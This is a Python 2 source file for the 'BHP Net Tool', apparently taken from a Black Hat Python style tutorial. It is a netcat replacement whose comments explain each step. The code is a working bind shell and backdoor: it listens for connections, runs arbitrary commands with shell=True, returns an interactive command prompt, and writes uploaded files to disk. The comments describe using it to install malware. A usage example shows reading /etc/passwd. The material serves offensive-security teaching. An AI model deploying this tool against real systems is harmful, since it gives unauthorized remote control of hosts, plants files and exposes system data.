#This program is meant to replace netcat

import sys
import socket
import getopt
import threading
import subprocess


#define some global variables
listen                  = False
command                 = False
upload                  = False
execute                 = ""
target                  = ""
upload_destination      = ""
port                    = 0

def usage():
        print "BHP Net Tool"
        print
        print "Usage: bhpnet.py -t target_host -p port"
        print "-l --listen              - listen on [host]:[port] for incoming connections"
        print "-e --execute=file_to_run - execute given file upon receiving a connection"
        print "-c --command             - initialize a command shell"
        print "-u --upload=destination  - upon receiving a connection upload a file and write to [destination]"
        print
        print
        print "examples: "
        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
        print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
        print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
        sys.exit(0)
#We begin by reading in all of the command-line options under the try: section and
# setting the necessary variables depending on the options we detect. If any of
# the command-line parameters don't match our criteria, we print out useful usage
# information (under def usage()). In the next block of code we are trying to
# mimic netcat to read data from stdin and send it across the network. As noted,
# if you plan on sending data interactively, you need to send a CTRL-D to bypass
# the stdin read. The final piece (if listen: server_loop()) is where we detect
# that we are to set up a listening socket and process further commands (upload a
# file, execute a command, start a command shell).

def client_sender(buffer):

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            #connect to our target host
                client.connect((target, port))

                if len(buffer):
                        client.send(buffer)

                while True:
                        # now wait for data back
                        recv_len = 1
                        response = ""

                        while recv_len:

                                data     = client.recv(4096)
                                recv_len = len(data)
                                response += data

                                if recv_len < 4096:
                                        break

                        print response,

                        # wait for more input
                        buffer = raw_input("")
                        buffer += "\n"

                        # send it off
                        client.send(buffer)



        except:

                print "[*]j Exception! Exiting..."

                # tear down the connection
                client.close()

# Most of this code should look familiar by now. we start by setting up our TCP
# socket object and then test (if len(buffer)) to see if we take any input from
# stdin. If all is well, we ship the data off (while recv_len:)  and receive
# data until there is no more data to receive. We await for further input from
# the user (buffer = raw_input("")) and continue send/receiving data until
# the user kills the script. The extra line break is attached specifically to
# user input so that our client will be compatible with our command shell. Now
# move on and create our primary server loop and a stub function that will handle
# both our command execution and our full command shell

def server_loop():
        global target

        # if no target is defined, we listen on all interfaces
        if not len(target):
                target = "0.0.0.0"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target, port))
        server.listen(5)

        while True:
                client_socket, addr = server.accept()

                # spin off a thread to handle our new client
                client_thread = threading.Thread(target=client_handler, args =(client_socket,))
                client_thread.start()

def run_command(command):

        # trim the newline
        command = command.rstrip()

        # run the command and get the output back
        try:

                output = subprocess.check_output(command, stderr=subprocess.STDOUT,
                        shell=True)
        except:

                output = "Failed to execute command.\r\n"

        # send the output back to the client
        return output

# We'll skip discussing the server_loop function since it should be clear from
# our previous server codes. The run_command function contains a new library we
# haven't covered yet: the SUBPROCESS library. Subprocess provides a powerful
# process-creation interface that gives you a number of ways to start and interact
# with  client programs. In this case (try: output = subprocess.check***) we are
# simply running whatever command we pass in, running it on the local OS, and
# returning the output from the command back to the client that is connected to
# us. The exception-handling code will catch generic errors and return back a
# message letting you know that the command failed. Now let's implement the
# logic for file uploads, command execution, and our shell


def client_handler(client_socket):

        global upload
        global execute
        global command

        # check for upload
        if len(upload_destination):

                # read in all of the bytes and write to our destination
                file_buffer = ""

                # keep reading data until none is available
                while True:
                        data = client_socket.recv(1024)

                        if not data:
                                break
                        else:
                                file_buffer += data

                # now we take these bytes and try to write them out
                try:
                        file_descriptor = open(upload_destination, "wb")
                        file_descriptor.write(file_buffer)
                        file_descriptor.close()

                        # acknowledge that we wrote the file out
                        client_socket.send("Successfully saved file to %s\r\n" %
                        upload_destination)
                except:

                        client_socket.send("Failed to save file to %s\r\n" %
                        upload_destination)

        #check for command execution
        if len(execute):

            # run the c0mmand
            output = run_command(execute)

            client_socket.send(output)

        #now we go into another loop if a command shell was requested
        if command:

            while True:
                #show a simple prompt
                client_socket.send("<BHP:#>")

                        # now we receive until we see a linefeed
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                        cmd_buffer += client_socket.recv(1024)


                # send back the command output
                response = run_command(cmd_buffer)

                # send back the response
                client_socket.send(response)

# the first chunk of code (if len(upload...) is responsible for determining
# whether our network tool is set to receive a file when it receives a connection.
# this can be useful for upload-and-execute exercises for installing malware and
# having the malware remove our Python callback. First we receive the file data in
# a loop (while: data = client.socket.recv(1024)) to make sure we receive it all,
# and then we siimply open a file handle and write out the contents of the file.
# the wb flag ensures that we are writing the file with binary mode enabled, which
# ensures that uploading and writing a binary executable will be successful. Next
# we process our execute functionality (try: file_descriptor = open(upload) block)
# which calls our previously written run_command function and simply sends the
# result back across the network. Our last bit of code handles our command shell;
# it continues to execute commands as we sned them in and sends back the output.
# You'll notice that it is scanning for a newline character to determine when to
# process a command, which makes it netcat-friendly. However, if you are conjuring
# up a Python client to speak to it, remember to add the newline character.

def main():
        global listen
        global port
        global execute
        global command
        global upload_destination
        global target

        if not len(sys.argv[1:]):
                usage()

        # read the commandline options
        try:
                opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                ["help", "listen", "execute", "target", "port", "command",
                "upload"])
        except getopt.GetoptError as err:
                print str(err)
                usage()

        for o, a in opts:
                if o in ("-h", "--help"):
                        usage()
                elif o in ("-l", "--listen"):
                        listen = True
                elif o in ("-e", "--execute"):
                        execute = a
                elif o in ("-c", "--commandshell"):
                        command = True
                elif o in ("-u", "--upload"):
                        upload_destination = a
                elif o in ("-t", "--target"):
                        target = a
                elif o in ("-p", "--port"):
                        port = int(a)
                else:
                        assert False, "Unhandled Option"

        # are we goign to listen or just send data from stdin?

        if not listen and len(target) and port > 0:

            #read in the buffer from the commandline
            #this will block, so send CTRL-D if not sending input
            # to stdin
            buffer = sys.stdin.read()

            #send data off
            client_sender(buffer)
            #we are going to listen and potentially
            # upload things, execute commans, and drop a shell back
            # depending on our command line options above
        if listen:
            server_loop()
main()
